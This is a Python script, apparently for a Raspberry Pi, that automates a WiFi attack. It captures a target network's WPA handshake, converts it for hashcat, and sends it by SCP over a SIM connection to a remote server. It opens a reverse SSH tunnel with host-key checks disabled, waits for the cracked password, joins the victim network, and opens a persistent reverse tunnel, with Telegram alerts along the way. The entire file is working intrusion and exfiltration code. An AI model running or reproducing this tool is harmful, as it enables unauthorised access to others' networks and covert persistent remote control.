import subprocess
import json
import time
import sys
import os

from common_functions import get_config_field, write_log

from components.airmon import Airmon
from components.airodump import Airodump

from send_handshake_methods import send_through_scp

from telegram_api import TelegramBot


def check_config_file():
    """This function checks if configuration file exists and has all mandatory keys."""
    
    file_path = 'src/configuration.json'
    mandatory_fields = ['interface', 'ssid', 'send_handshake', 'reverse_ssh_tunnel']
    
    if not os.path.isfile(file_path):
        write_log(f'[!] Configuration file "configuration.json" does not exist.')
        sys.exit(1)
    
    try:
        with open(file_path) as f:
            configuration_fields = json.load(f)
    
    except json.JSONDecodeError:
        write_log('[!] Error decoding JSON from "configuration.json". Check the file format.')
        sys.exit(1)
            
    missing_fields = [field for field in mandatory_fields if field not in configuration_fields]
    if missing_fields:
        for field in missing_fields:
            write_log(f'[!] Configuration file "configuration.json" uncomplete. Field "{field}" not found')
        
        sys.exit(1)
        
        
def check_dependencies():
    """Check if every required command is installed"""
    
    dependencies = ['hcxpcapngtool --help', 'minicom --help', 'dhclient --help', 'wpa_supplicant --help', 'screen --help']
    for command in dependencies:
        try:
            subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
        
        except subprocess.CalledProcessError:
            write_log(f'[!] Command "{command}" not installed')
            sys.exit(1)
            
            
def pcap_to_hashcat_format(file_name: str):
    """Transform the .pcap file from airodump into a hashcat readable format.

    Args:
        file_name (str): Name of the .pcap file. The name matches the parameter that was specified along with the '-w' option of airodump.
    """
    
    input_file = f'src/files/{file_name}-01.cap'
    output_file = f'src/files/{file_name}.hc22000'
    
    try:
        command = ['hcxpcapngtool', '-o', output_file, input_file]
        subprocess.run(command, capture_output=True, text=True, check=True)
        write_log(f'[+] .cap file exported correctly to hashcat format')
    
    except subprocess.CalledProcessError as e:
        write_log(f'[!] Failed to execute hcxpcapngtool. Command: {" ".join(command)}. Error: {e.stderr}')
        sys.exit(1)
        
        
def open_reverse_tunnel():
    """Open a reverse tunnel from the raspberry to the configured server. The configured server information must be specified in 'configuration.json' file with the 
    key 'reverse_ssh_tunnel'. The following fields are mandatory:
        - user: indicates the remote user
        - host: indicates the remote host
        - key_path: this field is very important to establish the connection. You have to specify the path where the private key (previosly generated and 
        configured in remote host) to connect to the remote host is placed.

    Returns:
        Return the process created with 'subprocess.Popen' to close the tunnel when necessary.
    """
    
    reverse_tunnel_information: dict = get_config_field('reverse_ssh_tunnel')
    
    remote_user = reverse_tunnel_information.get('user')
    remote_host = reverse_tunnel_information.get('host')
    key_path = reverse_tunnel_information.get('key_path')
    if not remote_user or not remote_host or not key_path:
        write_log(f'[!] You must specify fields "user", "host" and "key_path" to open a reverse tunnel')
        sys.exit(1)
    
    remote_port = 9090
    if reverse_tunnel_information.get('port'):
        remote_port = reverse_tunnel_information.get('port')

    command = ['screen', '-dmS', 'reverse_ssh_tunnel', 'ssh', '-i', key_path, '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', 
                '-R', f'{remote_port}:localhost:22', f'{remote_user}@{remote_host}', '-N']
    process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return process


def kill_process(process):
    """Kill the process passed as parameter

    Args:
        process: It is a process generated by 'subprocess.Popen'.
    """
    process.terminate()
    try:
        process.wait(10)
    except Exception:
        process.kill()

        
def enable_internet_through_sim():
    """Enable internet with a SIM card following the steps described in: https://www.waveshare.com/wiki/Raspberry_Pi_networked_via_RNDIS

    Returns:
        process: Instance of the execution of 'subprocess.Popen' to kill the process when necessary.
    """
    
    file_path = 'minicom/init.txt'

    if not os.path.isfile(file_path):
        write_log('[!] Script to start internet through SIM card does not exist.')
        sys.exit(1)
        
    command = ['minicom', '-D', '/dev/ttyUSB2', '-S', file_path]
    process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(30)
    
    try:
        command = ['dhclient', 'usb0']
        subprocess.run(command, capture_output=True, text=True, check=True)
        write_log('[+] Internet through SIM enabled.')
    
    except subprocess.CalledProcessError as e:
        write_log(f'[!] Failed to execute dhclient. Command: {" ".join(command)}. Error: {e.stderr}')
        sys.exit(1)
        
    return process
            
        
def disable_internet_through_sim():
    """Disable the connection to internet previously set up via SIM card"""
    
    file_path = 'minicom/stop.txt'
    
    if not os.path.isfile(file_path):
        write_log('[!] Script to stop internet through SIM card does not exist.')
        sys.exit(1)

    try:
        command = ['dhclient', '-r', 'usb0']
        subprocess.run(command, capture_output=True, text=True, check=True)
    
    except subprocess.CalledProcessError as e:
        write_log(f'[!] Failed to execute dhclient. Command: {" ".join(command)}. Error: {e.stderr}')
        sys.exit(1)
    
    time.sleep(10)
    
    command = ['minicom', '-D', '/dev/ttyUSB2', '-S', file_path]
    process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(30)
    
    kill_process(process)
    
    write_log('[+] Internet through SIM disabled.')
        


def send_captured_handshake(captured_handshake_file_name: str):
    """This method send the captured handshake following the method specified in 'configuration.json'

    Args:
        captured_handshake_file_name (str): Name of the .pcap file. The name matches the parameter that was specified along with the '-w' option of airodump.
    """
    
    # Transform .cap file to hashcat format with hcxpcappngtool
    pcap_to_hashcat_format(captured_handshake_file_name)
    
    # Once .hc22000 file has been stored, send
    method_to_send: dict = get_config_field("send_handshake")
    if 'scp' in method_to_send:
        scp_information = method_to_send.get('scp')
        send_through_scp(scp_information, captured_handshake_file_name)
        
        
def wait_for_cracked_password():
    """Wait to receive the cracked password.

    Returns:
        str | None: returns the cracked password or 'None' if there was an error.
    """
    
    cracked_password: str = None
    while not cracked_password:
        try:
            with open('src/files/cracked_password.txt') as f:
                cracked_password = f.read().replace('\n', '').replace('\r', '')
                    
        except FileNotFoundError:
            # time.sleep(120)  # wait for 2 minutes to check again in PROD
            time.sleep(30)
    
    return cracked_password


def connect_to_network(network_ssid: str, cracked_password: str):
    """Connect to the cracked network using 'wpa_supplicant' command.

    Args:
        network_ssid (str): the network name (ssid) specified in 'configuration.json'.
        cracked_password (str): cracked password in plain text.
    """
    
    # Generate wpa config file
    command = ['wpa_passphrase', network_ssid, cracked_password]
    with open(f'/tmp/{network_ssid}.conf', 'w') as f:
        subprocess.run(command, text=True, stdout=f)
        
    # Connect to wifi
    command = ['wpa_supplicant', '-B', '-i', 'wlan0', '-c', f'/tmp/{network_ssid}.conf']
    try:
        subprocess.run(command, capture_output=True, text=True, check=True)
    
    except subprocess.CalledProcessError as e:
        write_log(f'[!] Failed to execute wpa_supplicant. Command: {" ".join(command)}. Error: {e.stderr}')
        sys.exit(1)
    
    time.sleep(30)

    # Getting an IP
    command = ['dhclient', 'wlan0']
    try:
        subprocess.run(command, capture_output=True, text=True, check=True)
        
    except subprocess.CalledProcessError as e:
        write_log(f'[!] Failed to execute dhclient. Command {" ".join(command)}. Error: {e.stderr}')
        sys.exit(1)
    
    time.sleep(10)
    

def initialize_telegram_bot():
    """Create a telegram bot instance to send alert messages. If the necessary fields are not in 'configuration.json' returns 'None'.

    Returns:
        TelegramBot() | None: returns a TelegramBot instance if 'api_token' field is in 'configuration.json'. Otherwise returns 'None'.
    """
    
    telegram_bot = None
    
    telegram_bot_information: dict = get_config_field('telegram_bot')
    
    if telegram_bot_information and 'api_token' in telegram_bot_information and 'chat_id' in telegram_bot_information:
        api_token = telegram_bot_information.get('api_token')
        chat_id = telegram_bot_information.get('chat_id')
        telegram_bot = TelegramBot(api_token, chat_id)
    else:
        write_log('[!] Telegram bot information uncomplete. It has not been created')
        
    return telegram_bot
    
    
def telegram_message(telegram_bot: TelegramBot | None, message: str):
    """Sends a telegram message.

    Args:
        telegram_bot (TelegramBot | None): instance of TelegramBot if it was initialized.
        message (str): message to send.
    """
    
    if telegram_bot:
        telegram_bot.send_message(message)


if __name__ == '__main__':
    airmon: Airmon = Airmon()
    airodump: Airodump = Airodump()
    
    # Check if configuration file exists and it has every mandatory key
    check_config_file()
    
    # Check if every command it is installed
    check_dependencies()
    
    monitor_interface: str = airmon.start_monitor_mode()

    # Capture all reachable networks
    networks_file_name = airodump.capture_available_networks(monitor_interface)
    
    # Capture 4 way handshake
    network_ssid = get_config_field('ssid')
    handshake_file_name = airodump.capture_handshake(monitor_interface, network_ssid, networks_file_name)
    
    # Stop monitor mode and enable internet through SIM
    airmon.stop_monitor_mode(monitor_interface)
    sim_internet_process = enable_internet_through_sim()
    
    # Initialize telegram bot to notify
    telegram_bot: TelegramBot | None = initialize_telegram_bot()
    
    # Send captured handshake
    send_captured_handshake(handshake_file_name)
    telegram_message(telegram_bot, 'Handshake en formato hashcat enviado')
            
    # Open reverse tunnel to receive cracked password
    reverse_tunnel_process = open_reverse_tunnel()
    telegram_message(telegram_bot, 'Tunel abierto a la espera de recibir la password crackeada')
    
    cracked_password = wait_for_cracked_password()
    if not cracked_password:
        write_log('[!] Something went wrong reading cracked password')
        sys.exit(1)
        
    kill_process(reverse_tunnel_process)
    kill_process(sim_internet_process)
    
    disable_internet_through_sim()
    
    # Connect to cracked network
    connect_to_network(network_ssid, cracked_password)
    
    # Open persistent reverse tunnel
    open_reverse_tunnel()
    telegram_message(telegram_bot, 'Tunel persistente abierto')
